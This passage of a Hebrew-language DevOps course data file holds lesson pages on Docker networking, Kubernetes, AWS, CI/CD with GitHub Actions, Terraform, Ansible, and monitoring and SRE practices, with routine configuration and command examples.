<p><strong>חשוב:</strong> שמות ה-services הם גם ה-DNS hostnames ברשת הפנימית — <code>web</code> מגיע ל-<code>db</code> פשוט בשם <code>db</code>.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Docker Networking",
        content: `<div dir="rtl">
<h2>רשתות Docker — Bridge, Host, Overlay</h2>
<p>Docker יוצר רשתות וירטואליות שמאפשרות תקשורת בין קונטיינרים עם בידוד מלא מהחוץ.</p>
<table class="content-table">
  <tr><th>סוג רשת</th><th>שימוש</th><th>IP</th></tr>
  <tr><td><strong>bridge</strong></td><td>ברירת מחדל — קונטיינרים על אותו host</td><td>172.17.0.x</td></tr>
  <tr><td><strong>host</strong></td><td>קונטיינר משתמש ב-network של ה-host ישירות</td><td>כמו host</td></tr>
  <tr><td><strong>none</strong></td><td>בידוד מלא — אין רשת</td><td>—</td></tr>
  <tr><td><strong>overlay</strong></td><td>Swarm / K8s — תקשורת בין hosts שונים</td><td>10.0.x.x</td></tr>
</table>
<div class="code-preview"><pre><code># רשת מותאמת אישית — מומלץ תמיד!
docker network create mynet

docker run -d --name backend --network mynet myapp
docker run -d --name db --network mynet postgres:16

# backend יכול ל-ping db לפי שם:
docker exec backend ping db  # עובד!

# פתיחת פורט לעולם החיצוני
docker run -p 8080:8000 myapp
# host:8080 → container:8000

# הצג כל הרשתות
docker network ls
docker network inspect mynet

# Overlay ב-Docker Swarm
docker network create --driver overlay --attachable prod-net</code></pre></div>
<p><strong>כלל:</strong> תמיד צור user-defined bridge network — לא ב-default bridge. זה מאפשר DNS resolution לפי שם קונטיינר.</p>
</div>`
      }
    ]
  },
  {
    id: 203,
    title: "Kubernetes — אורקסטרציה",
    pages: [
      {
        type: "explanation",
        title: "אובייקטים בסיסיים — Pod, Deployment, Service",
        content: `<div dir="rtl">
<h2>הבניים הבסיסיים של K8s</h2>
<p>Kubernetes מנהל קונטיינרים בקנה מידה. במקום "הפעל קונטיינר", אתה מגדיר <strong>מצב רצוי</strong> — K8s דואג שזה תמיד יקרה.</p>
<div class="diagram-container">
<svg viewBox="0 0 360 120" class="content-diagram">
  <rect x="5" y="5" width="350" height="110" rx="8" fill="#0f172a" stroke="#334155" stroke-width="1.5"/>
  <text x="180" y="20" text-anchor="middle" font-size="10" fill="#94a3b8">Kubernetes Cluster</text>
  <rect x="15" y="28" width="150" height="75" rx="6" fill="#1e293b" stroke="#475569" stroke-width="1"/>
  <text x="90" y="42" text-anchor="middle" font-size="9" fill="#7dd3fc">Node 1</text>
  <rect x="22" y="48" width="60" height="48" rx="4" fill="#0f2744"/>
  <text x="52" y="62" text-anchor="middle" font-size="8" fill="#93c5fd">Pod A</text>
  <rect x="27" y="65" width="50" height="14" rx="2" fill="#1e3a5f"/>
  <text x="52" y="75" text-anchor="middle" font-size="7" fill="#60a5fa">nginx:1.25</text>
  <rect x="90" y="48" width="60" height="48" rx="4" fill="#0f2744"/>
  <text x="120" y="62" text-anchor="middle" font-size="8" fill="#93c5fd">Pod B</text>
  <rect x="95" y="65" width="50" height="14" rx="2" fill="#1e3a5f"/>
  <text x="120" y="75" text-anchor="middle" font-size="7" fill="#60a5fa">nginx:1.25</text>

  <rect x="175" y="28" width="175" height="75" rx="6" fill="#1e293b" stroke="#475569" stroke-width="1"/>
  <text x="262" y="42" text-anchor="middle" font-size="9" fill="#7dd3fc">Node 2</text>
  <rect x="182" y="48" width="60" height="48" rx="4" fill="#0f2744"/>
  <text x="212" y="62" text-anchor="middle" font-size="8" fill="#93c5fd">Pod C</text>
  <rect x="187" y="65" width="50" height="14" rx="2" fill="#1e3a5f"/>
  <text x="212" y="75" text-anchor="middle" font-size="7" fill="#60a5fa">nginx:1.25</text>
  <rect x="252" y="28" width="90" height="75" rx="6" fill="#14532d" stroke="#166534" stroke-width="1"/>
  <text x="297" y="48" text-anchor="middle" font-size="8" fill="#86efac">Service</text>
  <text x="297" y="62" text-anchor="middle" font-size="7" fill="#4ade80">LoadBalancer</text>
  <text x="297" y="76" text-anchor="middle" font-size="7" fill="#4ade80">80 → 8080</text>
</svg>
</div>
<table class="content-table">
  <tr><th>אובייקט</th><th>תפקיד</th></tr>
  <tr><td><strong>Pod</strong></td><td>יחידה הקטנה ביותר — קונטיינר אחד או יותר עם IP משותף</td></tr>
  <tr><td><strong>Deployment</strong></td><td>מנהל replicas של Pods — מבטיח שתמיד N עותקים רצים</td></tr>
  <tr><td><strong>Service</strong></td><td>כתובת IP קבועה ו-load balancer פנימי ל-Pods</td></tr>
  <tr><td><strong>Ingress</strong></td><td>HTTP routing חיצוני — נתב לפי hostname/path</td></tr>
  <tr><td><strong>ConfigMap</strong></td><td>הגדרות non-secret כ-key-value</td></tr>
  <tr><td><strong>Secret</strong></td><td>סיסמאות ו-tokens מוצפנים (base64)</td></tr>
</table>
</div>`
      },
      {
        type: "explanation",
        title: "YAML ו-kubectl — עבודה מעשית",
        content: `<div dir="rtl">
<h2>הגדרת משאבים ב-YAML</h2>
<p>ב-K8s כל דבר מוגדר בקובץ YAML. אתה מגדיר "מה אתה רוצה" — K8s דואג להגיע לשם.</p>
<div class="code-preview"><pre><code># deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
  namespace: production
spec:
  replicas: 3
  selector:
    matchLabels:
      app: myapp
  template:
    metadata:
      labels:
        app: myapp
    spec:
      containers:
      - name: myapp
        image: myapp:v2.1.0
        ports:
        - containerPort: 8000
        resources:
          requests:
            memory: "128Mi"
            cpu: "100m"
          limits:
            memory: "512Mi"
            cpu: "500m"
        env:
        - name: DB_PASSWORD
          valueFrom:
            secretKeyRef:
              name: db-secret
              key: password
---
# service.yaml
apiVersion: v1
kind: Service
metadata:
  name: myapp-svc
spec:
  selector:
    app: myapp
  ports:
  - port: 80
    targetPort: 8000
  type: ClusterIP</code></pre></div>
<div class="code-preview"><pre><code># פקודות kubectl חיוניות
kubectl apply -f deployment.yaml      # החל קובץ
kubectl get pods -n production        # רשימת Pods
kubectl describe pod myapp-abc123     # פרטים מלאים
kubectl logs myapp-abc123 -f          # לוגים בזמן אמת
kubectl exec -it myapp-abc123 -- bash # כניסה לקונטיינר
kubectl rollout history deploy/myapp  # היסטוריית deploys</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "HPA — Horizontal Pod Autoscaling",
        content: `<div dir="rtl">
<h2>סקיילינג אוטומטי לפי עומס</h2>
<p>HPA מוסיף/מסיר Pods אוטומטית לפי מדדים — CPU, Memory, או מדדים מותאמים כמו בקשות לשנייה.</p>
<table class="content-table">
  <tr><th>מדד</th><th>טריגר</th><th>פעולה</th></tr>
  <tr><td>CPU &gt; 70%</td><td>scale up</td><td>מוסיף Pods עד maxReplicas</td></tr>
  <tr><td>CPU &lt; 20%</td><td>scale down</td><td>מסיר Pods עד minReplicas</td></tr>
  <tr><td>Memory</td><td>מותאם</td><td>פחות נפוץ — תלוי workload</td></tr>
  <tr><td>Custom metric</td><td>Prometheus</td><td>כמות requests/s וכו'</td></tr>
</table>
<div class="code-preview"><pre><code># hpa.yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: myapp-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: myapp
  minReplicas: 2
  maxReplicas: 20
  metrics:
  - type: Resource
    resource:
      name: cpu
      target:
        type: Utilization
        averageUtilization: 70

# Rolling Update — zero downtime deploy
kubectl set image deployment/myapp myapp=myapp:v2.2.0
kubectl rollout status deployment/myapp

# Rollback אם משהו השתבש
kubectl rollout undo deployment/myapp</code></pre></div>
<p><strong>Rolling Update:</strong> K8s מחליף Pods אחד-אחד. בכל רגע יש גם Pods ישנים וגם חדשים — אין downtime.</p>
<p><strong>strategy.maxUnavailable:</strong> כמה Pods יכולים להיות unavailable בו-זמנית (ברירת מחדל: 25%).</p>
</div>`
      },
      {
        type: "explanation",
        title: "K8s Networking — CNI, DNS, Ingress",
        content: `<div dir="rtl">
<h2>רשתות ב-Kubernetes</h2>
<p>K8s יוצר רשת פלטה שבה כל Pod מקבל IP ייחודי ויכול לתקשר עם כל Pod אחר — גם על node אחר.</p>
<table class="content-table">
  <tr><th>רכיב</th><th>תפקיד</th></tr>
  <tr><td><strong>CNI Plugin</strong></td><td>מימוש רשת — Calico/Flannel/Weave. מקצה IPs לPods.</td></tr>
  <tr><td><strong>CoreDNS</strong></td><td>DNS פנימי — <code>myapp-svc.production.svc.cluster.local</code></td></tr>
  <tr><td><strong>kube-proxy</strong></td><td>iptables rules לניתוב תעבורה ל-Services</td></tr>
  <tr><td><strong>Ingress Controller</strong></td><td>nginx/Traefik — HTTP routing חיצוני</td></tr>
</table>
<div class="code-preview"><pre><code># ingress.yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: myapp-ingress
  annotations:
    nginx.ingress.kubernetes.io/rewrite-target: /
spec:
  rules:
  - host: myapp.example.com
    http:
      paths:
      - path: /api
        pathType: Prefix
        backend:
          service:
            name: myapp-svc
            port:
              number: 80
      - path: /
        pathType: Prefix
        backend:
          service:
            name: frontend-svc
            port:
              number: 80
  tls:
  - hosts:
    - myapp.example.com
    secretName: tls-secret</code></pre></div>
<p><strong>DNS resolution:</strong> Pod ב-namespace <code>production</code> ניגש לשירות <code>db-svc</code> בשם <code>db-svc.production</code> — ללא IP מפורש.</p>
</div>`
      }
    ]
  },
  {
    id: 204,
    title: "Cloud — AWS",
    pages: [
      {
        type: "explanation",
        title: "מודלי שירות — IaaS, PaaS, SaaS",
        content: `<div dir="rtl">
<h2>מה הענן בכלל מציע?</h2>
<p>ספקי ענן (AWS, Azure, GCP) מציעים 3 רמות שירות. ככל שעולים, מקבלים פחות שליטה — אבל גם פחות עבודה.</p>
<table class="content-table">
  <tr><th>מודל</th><th>אתה מנהל</th><th>הספק מנהל</th><th>דוגמה ב-AWS</th></tr>
  <tr><td><strong>IaaS</strong></td><td>OS, Runtime, App</td><td>חומרה, וירטואליזציה, רשת</td><td>EC2, EBS, VPC</td></tr>
  <tr><td><strong>PaaS</strong></td><td>הקוד שלך בלבד</td><td>OS, Runtime, Scaling, DB</td><td>Elastic Beanstalk, RDS</td></tr>
  <tr><td><strong>SaaS</strong></td><td>הגדרות משתמש</td><td>הכל</td><td>Gmail, Salesforce</td></tr>
  <tr><td><strong>FaaS</strong></td><td>פונקציה בודדת</td><td>הכל כולל scaling</td><td>AWS Lambda</td></tr>
</table>
<p><strong>אנלוגיה — פיצה:</strong></p>
<ul>
  <li><strong>On-Premise:</strong> בישול בבית — אתה קונה הכל</li>
  <li><strong>IaaS:</strong> קיבלת מטבח מצויד — אתה מבשל</li>
  <li><strong>PaaS:</strong> הזמנת חומרי גלם — המסעדה מבשלת</li>
  <li><strong>SaaS:</strong> הזמנת פיצה — אתה רק אוכל</li>
</ul>
<p><strong>מדוע עננים?</strong> Pay-as-you-go, Global reach, Elasticity, Managed security. Netflix מפעילה מיליוני שרתים ב-AWS ומשלמת רק על מה שמשתמשים.</p>
</div>`
      },
      {
        type: "explanation",
        title: "שירותי ליבה — EC2, S3, RDS",
        content: `<div dir="rtl">
<h2>הבלוקים הבסיסיים של AWS</h2>
<table class="content-table">
  <tr><th>שירות</th><th>מה זה</th><th>שימוש נפוץ</th></tr>
  <tr><td><strong>EC2</strong></td><td>שרתים וירטואליים (Virtual Machines)</td><td>backend, web servers</td></tr>
  <tr><td><strong>S3</strong></td><td>אחסון object — בלתי מוגבל</td><td>תמונות, backups, static site</td></tr>
  <tr><td><strong>RDS</strong></td><td>DB מנוהל (Postgres/MySQL/Aurora)</td><td>מסד נתונים ראשי</td></tr>
  <tr><td><strong>VPC</strong></td><td>רשת פרטית וירטואלית</td><td>בידוד ואבטחה</td></tr>
  <tr><td><strong>Route 53</strong></td><td>DNS מנוהל + health checks</td><td>ניתוב תעבורה עולמית</td></tr>
  <tr><td><strong>ALB</strong></td><td>Application Load Balancer</td><td>חלוקת עומסים, SSL termination</td></tr>
  <tr><td><strong>ECS/EKS</strong></td><td>הרצת קונטיינרים / Kubernetes</td><td>microservices</td></tr>
  <tr><td><strong>Lambda</strong></td><td>serverless functions</td><td>event-driven, batch jobs</td></tr>
</table>
<div class="code-preview"><pre><code># AWS CLI — דוגמאות
# הפעל EC2 instance
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t3.micro \
  --key-name my-keypair \
  --subnet-id subnet-12345678

# העלה קובץ ל-S3
aws s3 cp myfile.zip s3://my-bucket/backups/

# רשימת RDS instances
aws rds describe-db-instances \
  --query 'DBInstances[*].[DBInstanceIdentifier,DBInstanceStatus]'</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "VPC — רשת פרטית וירטואלית",
        content: `<div dir="rtl">
<h2>VPC: הרשת שלך בענן</h2>
<p>VPC (Virtual Private Cloud) הוא הרשת הפרטית שלך ב-AWS. כל דבר שתקים יהיה בתוכה. חשוב להבין את מבנה השכבות:</p>
<table class="content-table">
  <tr><th>רכיב VPC</th><th>תפקיד</th><th>CIDR לדוגמה</th></tr>
  <tr><td><strong>VPC</strong></td><td>הרשת הראשית שלך</td><td>10.0.0.0/16</td></tr>
  <tr><td><strong>Public Subnet</strong></td><td>גישה לאינטרנט — ALB, NAT GW</td><td>10.0.1.0/24</td></tr>
  <tr><td><strong>Private Subnet</strong></td><td>שרתים פנימיים — EC2, RDS</td><td>10.0.2.0/24</td></tr>
  <tr><td><strong>Internet Gateway</strong></td><td>שער לאינטרנט</td><td>—</td></tr>
  <tr><td><strong>NAT Gateway</strong></td><td>Private Subnet יוצא לאינטרנט</td><td>—</td></tr>
  <tr><td><strong>Security Group</strong></td><td>Firewall ברמת instance</td><td>—</td></tr>
  <tr><td><strong>NACL</strong></td><td>Firewall ברמת subnet</td><td>—</td></tr>
</table>
<p><strong>כלל אצבע:</strong> Load Balancer ב-Public Subnet. EC2 + RDS ב-Private Subnet. הם יוצאים לאינטרנט דרך NAT Gateway — אבל אף אחד לא יכול להגיע אליהם ישירות מבחוץ.</p>
<p>זה בדיוק כמו בית עם שומר בכניסה (ALB) שמעביר מבקרים לתוך — לא נותן לכולם להיכנס ישירות לחדר שינה (DB).</p>
</div>`
      },
      {
        type: "explanation",
        title: "Multi-AZ וסיפור ה-Chaos Monkey של Netflix",
        content: `<div dir="rtl">
<h2>High Availability: Multi-AZ Design</h2>
<p>AWS מחלקת כל Region ל-Availability Zones (AZs) — מרכזי נתונים פיזיים נפרדים, מחוברים בסיבים מהירים.</p>
<table class="content-table">
  <tr><th>עיצוב</th><th>זמינות</th><th>עלות</th></tr>
  <tr><td>Single-AZ</td><td>99.9%</td><td>זולה</td></tr>
  <tr><td>Multi-AZ (Active-Passive)</td><td>99.99%</td><td>x2</td></tr>
  <tr><td>Multi-Region</td><td>99.999%</td><td>x4-6</td></tr>
</table>
<p><strong>RDS Multi-AZ:</strong> Primary ב-AZ-1 + Standby ב-AZ-2. Failover אוטומטי תוך 60-120 שניות אם Primary נפל.</p>
<h3>סיפור: Netflix Chaos Monkey</h3>
<p>ב-2010 Netflix פיתחה כלי שנקרא <strong>Chaos Monkey</strong> — תוכנה שמכבה instance אקראי בפרודקשן, כל יום, בשעות העבודה.</p>
<p>הרציונל: "אם נדע שהכל יכול ליפול בכל רגע, נבנה מערכת שמתמודדת עם זה". Chaos Monkey הפכה ל-<strong>Simian Army</strong> שכולל:</p>
<ul>
  <li><strong>Chaos Gorilla</strong> — מוריד AZ שלמה</li>
  <li><strong>Latency Monkey</strong> — מוסיף latency לתגובות</li>
  <li><strong>Conformity Monkey</strong> — מוצא instances שלא עומדים בסטנדרטים</li>
</ul>
<p>התוצאה: Netflix מריצה מיליוני streams בו-זמנית עם 99.99%+ uptime — כי הם <strong>תכננו לכישלון</strong>.</p>
</div>`
      }
    ]
  },
  {
    id: 205,
    title: "CI/CD ו-IaC",
    pages: [
      {
        type: "explanation",
        title: "פילוסופיית DevOps",
        content: `<div dir="rtl">
<h2>DevOps: שבירת הקירות</h2>
<p>לפני DevOps, Development ו-Operations היו צוותים נפרדים עם תמריצים מנוגדים: Dev רצה לשלוח code מהר, Ops רצה יציבות. התוצאה: deploy פעם בחודש, כאוס.</p>
<table class="content-table">
  <tr><th>עיקרון</th><th>משמעות</th></tr>
  <tr><td><strong>Continuous Integration</strong></td><td>כל push → build + tests אוטומטיים</td></tr>
  <tr><td><strong>Continuous Delivery</strong></td><td>כל commit מוכן לדפלוי בלחיצת כפתור</td></tr>
  <tr><td><strong>Continuous Deployment</strong></td><td>כל commit עולה לפרודקשן אוטומטית</td></tr>
  <tr><td><strong>Infrastructure as Code</strong></td><td>תשתית = קוד ב-Git, גרסאות, review</td></tr>
  <tr><td><strong>Shift Left</strong></td><td>security ו-testing מוקדם בתהליך</td></tr>
</table>
<p><strong>מדדי DORA (מחקר Google 2019):</strong></p>
<ul>
  <li>Elite teams מדפלויים 973x יותר תכוף מ-low performers</li>
  <li>זמן lead time: שעות לעומת חודשים</li>
  <li>MTTR (זמן שיקום): שעה לעומת שבוע</li>
</ul>
<p>Amazon מדפלויים לפרודקשן כל <strong>11 שניות</strong>. זה אפשרי רק עם אוטומציה מלאה.</p>
</div>`
      },
      {
        type: "explanation",
        title: "GitHub Actions — CI/CD Pipeline",
        content: `<div dir="rtl">
<h2>GitHub Actions: אוטומציה בתוך GitHub</h2>
<p>GitHub Actions מריצה workflows אוטומטיים על כל push, PR, או לפי לו"ז. ללא שרת CI נפרד.</p>
<div class="code-preview"><pre><code># .github/workflows/deploy.yml
name: CI/CD Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4

    - name: Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.12'

    - name: Install dependencies
      run: |
        pip install -r requirements.txt
        pip install pytest

    - name: Run tests
      run: pytest tests/ -v --tb=short

  build-and-push:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4

    - name: Login to DockerHub
      uses: docker/login-action@v3
      with:
        username: \${{ secrets.DOCKER_USERNAME }}
        password: \${{ secrets.DOCKER_TOKEN }}

    - name: Build and push
      uses: docker/build-push-action@v5
      with:
        push: true
        tags: myapp:\${{ github.sha }}

  deploy:
    needs: build-and-push
    runs-on: ubuntu-latest
    steps:
    - name: Deploy to production
      run: |
        kubectl set image deployment/myapp \
          myapp=myapp:\${{ github.sha }}</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "Terraform — Infrastructure as Code",
        content: `<div dir="rtl">
<h2>Terraform: תשתית כקוד</h2>
<p>Terraform (HashiCorp) מאפשר להגדיר תשתית AWS/GCP/Azure בקבצי HCL. גרסאות ב-Git, review לפני apply, reproducible.</p>
<div class="code-preview"><pre><code># main.tf — VPC + EC2 ב-AWS
terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = "us-east-1"
}

resource "aws_vpc" "main" {
  cidr_block = "10.0.0.0/16"
  tags = {
    Name = "production-vpc"
  }
}

resource "aws_subnet" "public" {
  vpc_id     = aws_vpc.main.id
  cidr_block = "10.0.1.0/24"
  availability_zone = "us-east-1a"
}

resource "aws_instance" "web" {
  ami           = "ami-0abcdef1234567890"
  instance_type = "t3.micro"
  subnet_id     = aws_subnet.public.id
  tags = {
    Name = "web-server"
  }
}

# Output
output "instance_ip" {
  value = aws_instance.web.public_ip
}</code></pre></div>
<div class="code-preview"><pre><code># מחזור חיים של Terraform
terraform init    # הורדת providers
terraform plan    # תצוגה מקדימה — מה ישתנה?
terraform apply   # ביצוע השינויים
terraform destroy # הריסה מבוקרת</code></pre></div>
<p><strong>State file:</strong> Terraform שומר <code>terraform.tfstate</code> עם המצב הנוכחי. בצוות — שמרים ב-S3 עם DynamoDB לocking.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Ansible — Configuration Management",
        content: `<div dir="rtl">
<h2>Ansible: הגדרת שרתים בקנה מידה</h2>
<p>Ansible מגדיר את מצב השרתים (packages, files, services) בצורה declarative. Agentless — עובד על SSH בלבד.</p>
<table class="content-table">
  <tr><th>כלי</th><th>תפקיד</th><th>שפה</th></tr>
  <tr><td>Terraform</td><td>יצירת תשתית (provision)</td><td>HCL</td></tr>
  <tr><td>Ansible</td><td>הגדרת תוכן שרתים (configure)</td><td>YAML</td></tr>
  <tr><td>GitHub Actions</td><td>pipeline CI/CD</td><td>YAML</td></tr>
</table>
<div class="code-preview"><pre><code># playbook.yml — התקנת nginx על שרתים
---
- name: Setup web servers
  hosts: webservers
  become: yes  # sudo

  vars:
    app_port: 8000

  tasks:
  - name: Install nginx
    apt:
      name: nginx
      state: present
      update_cache: yes

  - name: Copy nginx config
    template:
      src: nginx.conf.j2
      dest: /etc/nginx/nginx.conf
    notify: restart nginx

  - name: Ensure nginx is running
    service:
      name: nginx
      state: started
      enabled: yes

  handlers:
  - name: restart nginx
    service:
      name: nginx
      state: restarted</code></pre></div>
<div class="code-preview"><pre><code"># inventory — רשימת שרתים
[webservers]
web1.example.com
web2.example.com

[databases]
db1.example.com ansible_user=ubuntu

# הרצה
ansible-playbook -i inventory playbook.yml</code></pre></div>
</div>`
      }
    ]
  },
  {
    id: 206,
    title: "Monitoring & SRE",
    pages: [
      {
        type: "explanation",
        title: "3 עמודות האבסרוובביליטי",
        content: `<div dir="rtl">
<h2>Observability: לדעת מה קורה</h2>
<p>מערכת מודרנית חייבת להיות observable — לא רק לעבוד, אלא לחשוף את מצבה הפנימי.</p>
<div class="diagram-container">
<svg viewBox="0 0 360 120" class="content-diagram">
  <rect x="10" y="10" width="100" height="95" rx="8" fill="#1e3a5f" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="60" y="35" text-anchor="middle" font-size="13" fill="#93c5fd">📊</text>
  <text x="60" y="55" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">Metrics</text>
  <text x="60" y="72" text-anchor="middle" font-size="8" fill="#94a3b8">מספרים לאורך זמן</text>
  <text x="60" y="87" text-anchor="middle" font-size="8" fill="#94a3b8">CPU, latency, RPS</text>

  <rect x="130" y="10" width="100" height="95" rx="8" fill="#14532d" stroke="#22c55e" stroke-width="1.5"/>
  <text x="180" y="35" text-anchor="middle" font-size="13" fill="#86efac">📋</text>
  <text x="180" y="55" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">Logs</text>
  <text x="180" y="72" text-anchor="middle" font-size="8" fill="#94a3b8">אירועים בטקסט</text>
  <text x="180" y="87" text-anchor="middle" font-size="8" fill="#94a3b8">errors, debug, audit</text>

  <rect x="250" y="10" width="100" height="95" rx="8" fill="#4c1d95" stroke="#a855f7" stroke-width="1.5"/>
  <text x="300" y="35" text-anchor="middle" font-size="13" fill="#c4b5fd">🔍</text>
  <text x="300" y="55" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">Traces</text>
  <text x="300" y="72" text-anchor="middle" font-size="8" fill="#94a3b8">מסלול בקשה</text>
  <text x="300" y="87" text-anchor="middle" font-size="8" fill="#94a3b8">microservices flow</text>
</svg>
</div>
<table class="content-table">
  <tr><th>עמוד</th><th>שאלה שעונה עליה</th><th>כלים</th></tr>
  <tr><td><strong>Metrics</strong></td><td>"האם המערכת בריאה?"</td><td>Prometheus, Grafana, CloudWatch</td></tr>
  <tr><td><strong>Logs</strong></td><td>"מה בדיוק קרה?"</td><td>ELK Stack, Loki, Splunk</td></tr>
  <tr><td><strong>Traces</strong></td><td>"מה המסלול של הבקשה?"</td><td>Jaeger, Zipkin, X-Ray</td></tr>
</table>
<p><strong>כלל ה-3 השאלות:</strong> "יש לי בעיה" (alert מ-Metrics) → "מה הבעיה?" (Logs) → "איפה בדיוק?" (Traces).</p>
</div>`
      },
      {
        type: "explanation",
        title: "Prometheus + Grafana",
        content: `<div dir="rtl">
<h2>המחסנית הסטנדרטית לניטור</h2>
<p>Prometheus אוסף מדדים בformatting מוגדר (scraping). Grafana מציגה dashboards. AlertManager שולח התראות.</p>
<div class="code-preview"><pre><code"># prometheus.yml — הגדרת scraping
global:
  scrape_interval: 15s

scrape_configs:
  - job_name: 'myapp'
    static_configs:
      - targets: ['myapp:8000']

  - job_name: 'node-exporter'
    static_configs:
      - targets: ['node-exporter:9100']

# כלל התראה
groups:
- name: myapp
  rules:
  - alert: HighErrorRate
    expr: |
      rate(http_requests_total{status=~"5.."}[5m])
      / rate(http_requests_total[5m]) > 0.05
    for: 5m
    labels:
      severity: critical
    annotations:
      summary: "שגיאות מעל 5% מהבקשות"</code></pre></div>
<div class="code-preview"><pre><code"># Python — חשיפת metrics לPrometheus
from prometheus_client import Counter, Histogram, start_http_server

REQUEST_COUNT = Counter('http_requests_total',
                        'Total requests', ['method', 'status'])
REQUEST_LATENCY = Histogram('http_request_duration_seconds',
                            'Request latency')

@app.middleware("http")
async def metrics_middleware(request, call_next):
    with REQUEST_LATENCY.time():
        response = await call_next(request)
    REQUEST_COUNT.labels(request.method, response.status_code).inc()
    return response</code></pre></div>
<p><strong>PromQL מועיל:</strong> <code>rate(http_requests_total[5m])</code> — בקשות לשנייה. <code>histogram_quantile(0.99, ...)</code> — P99 latency.</p>
</div>`
      },
      {
        type: "explanation",
        title: "SLI, SLO, SLA — ניהול אמינות",
        content: `<div dir="rtl">
<h2>שפת האמינות של Google SRE</h2>
<p>Google המציאה את תחום ה-SRE (Site Reliability Engineering) — גישה מהנדסית לניהול שירותים בפרודקשן.</p>
<table class="content-table">
  <tr><th>מושג</th><th>הגדרה</th><th>דוגמה</th></tr>
  <tr><td><strong>SLI</strong> (Indicator)</td><td>המדד שמודדים</td><td>% בקשות שהחזירו תגובה תוך 200ms</td></tr>
  <tr><td><strong>SLO</strong> (Objective)</td><td>היעד הפנימי</td><td>99.9% הבקשות מגיבות תוך 200ms</td></tr>
  <tr><td><strong>SLA</strong> (Agreement)</td><td>הסכם עם לקוחות</td><td>99.5% — אחרת קרדיט כספי</td></tr>
  <tr><td><strong>Error Budget</strong></td><td>מה מותר להיכשל</td><td>0.1% = 43.8 דקות/חודש downtime</td></tr>
</table>
<p><strong>Error Budget — הרעיון המפתח:</strong> SLO של 99.9% = 0.1% error budget לחודש. אם השתמשנו ב-50% מהתקציב → אפשר לדפלוי בזהירות. אם ניצלנו 100% → אסור לדפלוי עד שמשקמים.</p>
<p>זה פותר את המתח Dev-Ops: שניהם עובדים עם אותו budget. Dev רוצה לדפלוי → צריך לשמור error budget. Ops לא "חוסם" — ה-math עושה את זה.</p>
<div class="code-preview"><pre><code"># חישוב Error Budget
slo = 99.9  # %
minutes_per_month = 30 * 24 * 60  # = 43,200 דקות
error_budget_minutes = minutes_per_month * (100 - slo) / 100
# = 43.2 דקות downtime מותר בחודש</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "ELK Stack ותרבות Postmortem",
        content: `<div dir="rtl">
<h2>ELK: ניהול לוגים בקנה מידה</h2>
<p>ELK = Elasticsearch + Logstash + Kibana. אוסף, מאחסן ומציג מיליארדי שורות לוג מהיר.</p>
<table class="content-table">
  <tr><th>רכיב</th><th>תפקיד</th></tr>
  <tr><td><strong>Elasticsearch</strong></td><td>מאגר נתונים לחיפוש מהיר — מאחסן לוגים</td></tr>
  <tr><td><strong>Logstash</strong></td><td>מעבד ומפרמט לוגים מכל מקור</td></tr>
  <tr><td><strong>Kibana</strong></td><td>UI לחיפוש, dashboards, alerts</td></tr>
  <tr><td><strong>Filebeat</strong></td><td>agent קל על השרתים — שולח לוגים ל-ELK</td></tr>
</table>
<h3>תרבות Postmortem — ממוגלה ל-Google</h3>
<p>כשמשהו נשבר בפרודקשן — מה עושים? חברות טובות כותבות <strong>Postmortem (blameless)</strong>:</p>
<ol>
  <li><strong>Timeline:</strong> מה קרה בדיוק, בכל דקה</li>
  <li><strong>Root Cause:</strong> מה גרם לתקלה (לא מי!)</li>
  <li><strong>Impact:</strong> כמה משתמשים נפגעו, כמה זמן</li>
  <li><strong>Action Items:</strong> מה נשנה כדי שזה לא יקרה שוב</li>
</ol>
<p><strong>"Blameless":</strong> אנשים לא מפחדים לדווח על תקלות — כי המטרה היא ללמוד, לא להעניש. Google מפרסמת postmortems פנימיים בפומבי. <strong>כישלון שלא לומדים ממנו הוא הכישלון האמיתי.</strong></p>
<p>Etsy המציאה את הגישה הזו ב-2012. היום זה standard ב-Netflix, Google, Amazon, ו-Cloudflare (שמפרסמת postmortems ציבוריים מפורסמים).</p>
</div>`
      }
    ]
  },
  {
    id: 207,
    title: "Terraform ו-Infrastructure as Code",
    pages: [
      {
        type: "explanation",
        title: "מה זה Infrastructure as Code?",
        content: `<div dir="rtl">
<h2>תשתית כקוד — מדוע זה שינה הכל</h2>
<p>פעם, להקים שרת חדש אמר: לפתוח ticket ל-Ops, לחכות שבוע, לצלצל, לחכות עוד. היום? מריצים קובץ — ותוך 3 דקות יש EC2 instance, VPC, security group, ו-DNS record — הכל אוטומטי.</p>
<p><strong>Infrastructure as Code (IaC)</strong> אומר שהתשתית מוגדרת בקובצי טקסט המנוהלים ב-Git, בדיוק כמו קוד אפליקציה. יש לכם version history, code review, ו-CI/CD לתשתית.</p>
<table class="content-table">
  <tr><th>גישה ידנית</th><th>IaC</th></tr>
  <tr><td>Click בconsole — לא ניתן לשחזר</td><td>קוד ב-Git — reproducible תמיד</td></tr>
  <tr><td>Configuration drift — שרתים שונים</td><td>Idempotent — אותה תוצאה בכל הרצה</td></tr>
  <tr><td>Snowflake servers — כל שרת ייחודי</td><td>Cattle not pets — שרתים זהים</td></tr>
  <tr><td>Documentation מיושנת</td><td>הקוד הוא התיעוד</td></tr>
</table>
